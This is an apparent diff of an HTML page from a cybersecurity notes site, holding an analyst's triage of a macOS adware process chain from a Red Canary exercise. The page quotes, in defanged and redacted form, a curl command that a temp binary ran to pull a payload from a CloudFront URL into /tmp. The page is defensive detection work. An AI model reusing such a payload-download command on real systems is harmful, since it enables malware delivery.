@@ -3,24 +3,28 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Scenario #4 Analysis · Will Seligman</title>
-<link rel="stylesheet" href="/assets/style.css">
+<meta name="color-scheme" content="dark">
+<title>Scenario #4 Analysis · the-grizzly-bear</title>
+<meta name="description" content="Scenario #4 Analysis — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
 <div class="layout">
 <aside class="sidebar" id="sidebar">
-  <a class="brand" href="/index.html">
+  <a class="brand" href="../../../index.html">
     <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
   </a>
-  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-4-analysis.html"></nav>
+  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-4-analysis.html" data-root="../../.."></nav>
 </aside>
 <main class="content">
   <article class="doc">
-  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/exercises.html">Exercises</a> &rsaquo; <a href="/other/exercises/red-canary.html">Red Canary</a></div>
-  <h1 id="scenario-4-analysis">Scenario #4 Analysis</h1>
-<pre><code class="language-text">
+  <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">Other</a> &rsaquo; <a href="../index.html">Exercises</a> &rsaquo; <a href="index.html">Red Canary</a></div>
+<h1 id="title">Scenario #4 Analysis</h1>
+
+<pre><code>
 Grand-Parent Process: /private/tmp/b6yNLWzjO 
 
 #https://www.virustotal.com/gui/file/96792f6318b530f40868c3bde69f8fad0ff6ce7e646bd702e93d3633e033c4bb labeled OSX, adware.bundlore/bnodlero
@@ -29,8 +33,6 @@ Grand-Parent MD5: ab47aa51b678216bc998fe7e5fe7aefd
 #The system shows signs of potentially malicious activity originating from the executable /private/tmp/b6yNLWzjO
 Grand-Parent CLI:
 /tmp/b6yNLWzjO /Volumes/Installer/Installer.app/Contents/MacOS/LightEvening
-
-
 
 #launched a parent shell process 
 Parent Process: /bin/sh
@@ -41,8 +43,6 @@ Parent MD5: 95d23ed8b5448779eee9863d2bc5c1ba
 #executing a curl command to download a file from a suspicious CloudFront URL
 Parent CLI: 
 sh -c curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-34926AEDF82D ’hxxp://redacted.cloudfront[.]net/sd/?c=22lybQ==&amp;u=67D936BA-DC18-5557-AF59-A61155059BC5&amp;s=EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63&amp;o=10.15.7&amp;b=11821208528&amp;gs=1' &gt; /dev/null 2&gt;&amp;1
-
-
 
 #download the payload to a temporary directory 
 Process: /usr/bin/curl
@@ -55,19 +55,18 @@ curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-3
 
 #two active network connections and three file modifications, this behavior suggests an attempt to download and potentially execute malicious software
 Network connection count: 2
-File modifications: 3
-</code></pre>
-<p><strong>Overview</strong><br />
-The process chain exhibits characteristics of malicious behavior, leveraging a temporary binary (<code>/private/tmp/b6yNLWzjO</code>) as the <strong>grand-parent process</strong> to initiate a <strong>parent shell process</strong> (<code>/bin/sh</code>) for executing a <code>curl</code> command. <br />
-The command fetches a file from a suspicious CloudFront-hosted URL (<code>hxxp://redacted.cloudfront[.]net/sd/...</code>) and writes it to a temporary directory (<code>/tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63</code>). <br />
-The fetched file's path, combined with associated <strong>file modifications</strong> and <strong>network connections</strong>, suggests an attempt to deploy a payload or establish persistence. </p>
-<p><strong>Summary</strong><br />
-This process chain demonstrates a highly suspicious sequence indicative of malware delivery or staging activity. The use of temporary binaries, unauthorized network activity, and file modifications aligns with tactics used for initial access, payload delivery, and execution. Immediate investigation into the source of the temporary binary, the contents of the downloaded file, and system integrity is warranted to mitigate further compromise.</p>
+File modifications: 3</code></pre>
+<p><strong>Overview</strong></p>
+<p>The process chain exhibits characteristics of malicious behavior, leveraging a temporary binary (<code>/private/tmp/b6yNLWzjO</code>) as the <strong>grand-parent process</strong> to initiate a <strong>parent shell process</strong> (<code>/bin/sh</code>) for executing a <code>curl</code> command.</p>
+<p>The command fetches a file from a suspicious CloudFront-hosted URL (<code>hxxp://redacted.cloudfront[.]net/sd/...</code>) and writes it to a temporary directory (<code>/tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63</code>).</p>
+<p>The fetched file's path, combined with associated <strong>file modifications</strong> and <strong>network connections</strong>, suggests an attempt to deploy a payload or establish persistence.</p>
+<p><strong>Summary</strong></p>
+<p>This process chain demonstrates a highly suspicious sequence indicative of malware delivery or staging activity. The use of temporary binaries, unauthorized network activity, and file modifications aligns with tactics used for initial access, payload delivery, and execution. Immediate investigation into the source of the temporary binary, the contents of the downloaded file, and system integrity is warranted to mitigate further compromise.</p>
   </article>
-  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
 </div>
-<script src="/assets/nav.js" defer></script>
+<script src="../../../assets/nav.js" defer></script>
 <script>
 document.getElementById('menu-toggle').addEventListener('click',function(){
   document.getElementById('sidebar').classList.toggle('open');
